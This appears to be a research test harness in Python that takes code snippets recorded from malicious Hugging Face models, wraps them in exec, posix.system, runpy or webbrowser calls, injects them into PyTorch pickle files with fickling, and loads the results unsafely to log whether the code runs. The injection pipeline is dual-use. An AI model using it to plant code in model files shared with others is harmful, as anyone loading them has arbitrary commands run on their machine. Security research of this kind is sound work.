import os
import threading
import tempfile
import pickle
import traceback
import csv
import datetime
from fickling.pytorch import Pickled, PyTorchModelWrapper
import zipfile
import io
import sys
import torch
import pandas as pd
from torch.serialization import MAP_LOCATION

# Global logging configuration
LOG_FIELDNAMES = [
    "timestamp",
    "model_path",
    "filename",
    "payload_index",
    "payload_content",
    "payload_library",
    "original_model_id",
    "injection_status",
    "injection_error",
    "output_file",
    "load_status",
    "load_error",
    "load_timeout",
    "stdout_captured",
    "stderr_captured",
    "execution_time_seconds",
]


def write_log_entry(log_data, log_filename="injection_log.csv"):
    """Write a single log entry to the CSV file"""
    file_exists = os.path.isfile(log_filename)
    with open(log_filename, "a", newline="", encoding="utf-8") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=LOG_FIELDNAMES)
        if not file_exists:
            writer.writeheader()
        writer.writerow(log_data)


def load_payloads_from_csv(csv_path="../malhug_result_info.csv"):
    """Load and prepare payloads from the CSV file"""
    df = pd.read_csv(csv_path, sep=",", encoding="ISO-8859-1")
    df.columns = df.columns.str.strip().str.lower().str.replace(" ", "_")

    df["code_segment1_clean"] = df["code_segment1"].fillna("").astype(str).str.strip()

    df_non_empty = df[
        (df["code_segment1_clean"] != "")
        & (df["libraries_and_apis"].notna())
        & (df["libraries_and_apis"].str.strip() != "")
    ]

    payload_mapping = {}
    final_list = []

    for idx, row in df_non_empty.iterrows():
        library = row["libraries_and_apis"].strip()
        payload = row["code_segment1_clean"]
        model_id = row.get("model_id/dataset_id", "unknown")

        if "Keras.Lambda" not in library:
            current_payload_index = len(final_list)

            if library == "webbrowser.open":
                if payload.startswith("http"):
                    final_payload = f"""import webbrowser
webbrowser.open("{payload}")"""
                    final_list.append(final_payload)
                    payload_mapping[current_payload_index] = (
                        model_id,
                        library,
                        final_payload,
                    )
            elif library == "exec" or library == "eval":
                final_list.append(payload)
                payload_mapping[current_payload_index] = (model_id, library, payload)
            elif library == "posix.system":
                final_payload = f"""import posix
posix.system("{payload}")"""
                final_list.append(final_payload)
                payload_mapping[current_payload_index] = (
                    model_id,
                    library,
                    final_payload,
                )
            elif library == "runpy._run_code":
                final_payload = f"""import runpy
runpy._run_code('''{payload}''', {{}})"""
                final_list.append(final_payload)
                payload_mapping[current_payload_index] = (
                    model_id,
                    library,
                    final_payload,
                )

    return final_list, payload_mapping


def load_model_with_threading_timeout(file_path, timeout=10):
    """Load model using threading with timeout"""
    result = [None]
    exception = [None]

    def load_model():
        try:
            result[0] = torch.load(file_path, weights_only=False, map_location="cpu")
        except Exception as e:
            exception[0] = e

    thread = threading.Thread(target=load_model)
    thread.daemon = True
    thread.start()
    thread.join(timeout)

    if thread.is_alive():
        # Thread is still running, timeout occurred
        print(f"torch.load() timed out after {timeout} seconds")
        return None, True, None  # result, timeout_occurred, exception

    if exception[0]:
        return None, False, exception[0]

    return result[0], False, None


def inject_and_test_single_model(
    file_path, payload_index, payload, payload_mapping, log_filename="injection_log.csv"
):
    """Inject payload into a single model and test it"""
    filename = os.path.basename(file_path)

    # Initialize log entry
    start_time = datetime.datetime.now()
    log_entry = {
        "timestamp": start_time.isoformat(),
        "model_path": file_path,
        "filename": filename,
        "payload_index": payload_index,
        "payload_content": "",
        "payload_library": "",
        "original_model_id": "",
        "injection_status": "FAILED",
        "injection_error": "",
        "output_file": "",
        "load_status": "NOT_ATTEMPTED",
        "load_error": "",
        "load_timeout": False,
        "stdout_captured": "",
        "stderr_captured": "",
        "execution_time_seconds": 0,
    }

    try:
        if payload_index in payload_mapping:
            model_id, library, _ = payload_mapping[payload_index]
            log_entry["original_model_id"] = model_id
            log_entry["payload_library"] = library
        log_entry["payload_content"] = payload[:500]

        print(f"Injecting payload [{payload_index}]: {payload[:100]}...")

        model = PyTorchModelWrapper(file_path, force=True)

        output_file = os.path.join(
            os.path.dirname(file_path), f"data_edited_{payload_index}.bin"
        )
        model.inject_payload(payload, output_file, injection="insertion")

        log_entry["injection_status"] = "SUCCESS"
        log_entry["output_file"] = output_file
        print("Injected successfully")

        try:
            print("Loading injected model...")
            log_entry["load_status"] = "ATTEMPTING"

            with (
                tempfile.TemporaryFile(mode="w+", encoding="utf-8") as temp_stdout,
                tempfile.TemporaryFile(mode="w+", encoding="utf-8") as temp_stderr,
            ):
                original_stdout_fd = os.dup(1)
                original_stderr_fd = os.dup(2)

                try:
                    # Redirect file descriptors
                    os.dup2(temp_stdout.fileno(), 1)
                    os.dup2(temp_stderr.fileno(), 2)

                    print("Hello from inside Python!")
                    print("Another line.")

                    # Load model with timeout
                    loaded_model, timeout_occurred, load_exception = (
                        load_model_with_threading_timeout(output_file, timeout=20)
                    )

                    if timeout_occurred:
                        log_entry["load_status"] = "TIMEOUT"
                        log_entry["load_timeout"] = True
                        print("Model loading timed out")
                    elif load_exception:
                        log_entry["load_status"] = "ERROR"
                        log_entry["load_error"] = str(load_exception)
                        print(f"Model loading failed: {load_exception}")
                    elif loaded_model is not None:
                        log_entry["load_status"] = "SUCCESS"
                        print("Loaded injected model successfully")
                    else:
                        log_entry["load_status"] = "FAILED"
                        print("Model loading failed (unknown reason)")

                finally:
                    os.dup2(original_stdout_fd, 1)
                    os.dup2(original_stderr_fd, 2)
                    os.close(original_stdout_fd)
                    os.close(original_stderr_fd)

                temp_stdout.seek(0)
                temp_stderr.seek(0)
                stdout_content = temp_stdout.read()
                stderr_content = temp_stderr.read()

                log_entry["stdout_captured"] = stdout_content[:1000]
                log_entry["stderr_captured"] = stderr_content[:1000]

                print("Captured output:")
                print("STDOUT:", stdout_content)
                if stderr_content:
                    print("STDERR:", stderr_content)

        except Exception as e:
            log_entry["load_status"] = "ERROR"
            log_entry["load_error"] = str(e)
            print(f"Loading failed for {file_path}: {e}")

    except Exception as e:
        log_entry["injection_status"] = "FAILED"
        log_entry["injection_error"] = str(e)
        print(f"Failed to process '{file_path}': {type(e).__name__}: {e}")
        traceback.print_exc()

    end_time = datetime.datetime.now()
    log_entry["execution_time_seconds"] = (end_time - start_time).total_seconds()
    write_log_entry(log_entry, log_filename)
    print(f"Log entry written for {filename}")

    return (
        log_entry["injection_status"] == "SUCCESS",
        log_entry["load_status"] == "SUCCESS",
        log_entry["output_file"],
    )
